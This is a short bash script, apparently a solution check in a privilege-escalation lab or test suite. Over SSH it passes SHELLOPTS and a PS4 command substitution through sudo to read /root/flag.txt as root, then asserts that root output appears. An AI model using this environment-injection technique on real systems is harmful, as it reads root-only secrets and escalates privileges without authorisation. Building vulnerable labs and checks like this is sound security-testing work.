#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run 'sudo -n SHELLOPTS=xtrace bash -c '"'"'PS4="$(cat /root/flag.txt)"; set -x; :'"'"' 2>&1')"
assert_root_output "${out}"
